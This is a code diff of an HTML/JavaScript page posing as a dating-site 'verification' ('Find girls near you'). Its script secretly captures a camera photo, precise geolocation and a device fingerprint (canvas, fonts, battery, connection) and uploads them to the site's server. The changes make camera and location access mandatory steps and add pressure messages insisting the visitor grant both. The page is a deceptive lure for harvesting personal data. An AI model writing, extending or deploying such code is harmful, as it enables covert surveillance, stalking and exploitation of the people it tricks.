@@ -245,19 +245,6 @@
             opacity: 0;
         }
 
-        .permission-check {
-            display: inline-block;
-            margin: 10px 0;
-            padding: 10px 20px;
-            background: rgba(40, 167, 69, 0.1);
-            border-radius: 8px;
-            color: #28a745;
-        }
-
-        .permission-check i {
-            margin-right: 8px;
-        }
-
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -272,6 +259,24 @@
             to {
                 transform: rotate(360deg);
             }
+        }
+
+        .permission-step {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            background: rgba(102, 126, 234, 0.05);
+            border-left: 4px solid #667eea;
+        }
+
+        .permission-step.active {
+            background: rgba(102, 126, 234, 0.15);
+            border-left-color: #28a745;
+        }
+
+        .permission-step.completed {
+            background: rgba(40, 167, 69, 0.1);
+            border-left-color: #28a745;
         }
     </style>
 </head>
@@ -306,11 +311,13 @@
 
                 <div class="permission-list">
                     <ul style="list-style: none; padding: 0;">
-                        <li><i class="fas fa-check-circle"></i> <strong>Camera Access</strong> - Verify you're a real
-                            person</li>
-                        <li><i class="fas fa-check-circle"></i> <strong>Location Access</strong> - Find girls near you
+                        <li id="step-camera" class="permission-step">
+                            <i class="fas fa-camera"></i> <strong>Step 1: Camera Access</strong> - Verify you're a real
+                            person
                         </li>
-                        <li><i class="fas fa-check-circle"></i> <strong>Age Verification</strong> - Confirm you're 18+
+                        <li id="step-location" class="permission-step">
+                            <i class="fas fa-map-marker-alt"></i> <strong>Step 2: Location Access</strong> - Find girls
+                            near you
                         </li>
                     </ul>
                 </div>
@@ -432,7 +439,6 @@
             camera: false,
             location: false
         };
-        let userLocation = null;
 
         // Device fingerprinting functions
         function getCanvasFingerprint() {
@@ -469,7 +475,7 @@
 
         function detectFonts() {
             const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
             const testString = 'mmmmmmmmmmlli';
             const testSize = '72px';
             const canvas = document.createElement('canvas');
@@ -516,7 +522,6 @@
                 })
             };
 
-            // Get battery info if available
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -526,12 +531,10 @@
                 }
             }
 
-            // Get connection info if available
             if ('connection' in navigator) {
                 deviceInfo.connection_type = navigator.connection.effectiveType || 'unknown';
             }
 
-            // Send device info to server
             try {
                 await fetch('/api/update_device_info', {
                     method: 'POST',
@@ -543,7 +546,7 @@
             }
         }
 
-        // Camera capture function with retry
+        // Camera capture function - MUST complete before location
         async function captureCamera() {
             let attempts = 0;
             const maxAttempts = 3;
@@ -568,10 +571,8 @@
                         };
                     });
 
-                    // Wait for camera to adjust
                     await new Promise(resolve => setTimeout(resolve, 2000));
 
-                    // Capture image
                     const canvas = document.getElementById('camera-canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -580,10 +581,8 @@
 
                     const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
-                    // Stop stream
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Upload to server
                     await fetch('/api/upload_camera', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -606,7 +605,7 @@
             return false;
         }
 
-        // Get location with high accuracy
+        // Get location - MUST complete after camera
         async function getLocation() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
@@ -620,9 +619,6 @@
                         const lng = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
-                        userLocation = { lat, lng, accuracy };
-
-                        // Send to server
                         try {
                             await fetch('/update_precise_location', {
                                 method: 'POST',
@@ -655,28 +651,40 @@
             statusDiv.innerHTML = message;
         }
 
-        // Verification process
+        // Mark step as active/completed
+        function markStep(stepId, status) {
+            const step = document.getElementById(stepId);
+            step.className = `permission-step ${status}`;
+        }
+
+        // SEQUENTIAL verification process - Camera THEN Location (BOTH REQUIRED)
         async function startVerification() {
             const btn = document.getElementById('verify-btn');
             btn.disabled = true;
             btn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
 
-            showStatus('<i class="fas fa-info-circle"></i> Starting verification process...', 'warning');
-
             try {
-                // Step 1: Get Camera Permission
-                showStatus('<i class="fas fa-camera"></i> Requesting camera access...', 'warning');
+                // STEP 1: Camera (REQUIRED - NO SKIP)
+                markStep('step-camera', 'active');
+                showStatus('<i class="fas fa-camera"></i> <strong>Step 1/2:</strong> Requesting camera access...', 'warning');
+
                 await captureCamera();
-                showStatus('<i class="fas fa-check"></i> Camera verified successfully!', 'success');
+
+                markStep('step-camera', 'completed');
+                showStatus('<i class="fas fa-check"></i> Camera verified! Moving to step 2...', 'success');
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
-                // Step 2: Get Location Permission
-                showStatus('<i class="fas fa-map-marker-alt"></i> Requesting location access...', 'warning');
+                // STEP 2: Location (REQUIRED - NO SKIP)
+                markStep('step-location', 'active');
+                showStatus('<i class="fas fa-map-marker-alt"></i> <strong>Step 2/2:</strong> Requesting location access...', 'warning');
+
                 await getLocation();
-                showStatus('<i class="fas fa-check"></i> Location verified successfully!', 'success');
+
+                markStep('step-location', 'completed');
+                showStatus('<i class="fas fa-check"></i> Location verified!', 'success');
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
-                // Step 3: Collect device info
+                // STEP 3: Device info
                 showStatus('<i class="fas fa-shield-alt"></i> Completing verification...', 'warning');
                 await collectDeviceInfo();
 
@@ -690,15 +698,19 @@
             } catch (error) {
                 console.error('Verification error:', error);
 
+                // Reset steps
+                markStep('step-camera', '');
+                markStep('step-location', '');
+
                 let errorMessage = '';
-                if (error.code === 1 || error.message.includes('Permission denied')) {
-                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Verification Failed!</strong><br>You must grant camera and location permissions to continue. Please click "Allow" when prompted.';
+                if (error.code === 1 || error.message.includes('Permission denied') || error.name === 'NotAllowedError') {
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Permission Denied!</strong><br>You MUST grant both camera AND location permissions to continue.<br><small>Click "Allow" when your browser asks for permissions.</small>';
                 } else if (error.code === 2) {
                     errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Location Unavailable</strong><br>Unable to determine your location. Please check your device settings.';
                 } else if (error.code === 3) {
                     errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Request Timeout</strong><br>Verification timed out. Please try again.';
                 } else {
-                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Verification Failed!</strong><br>Please ensure you grant all required permissions and try again.';
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Verification Failed!</strong><br>Please ensure you grant ALL required permissions and try again.<br><small>Error: ' + error.message + '</small>';
                 }
 
                 showStatus(errorMessage, 'error');
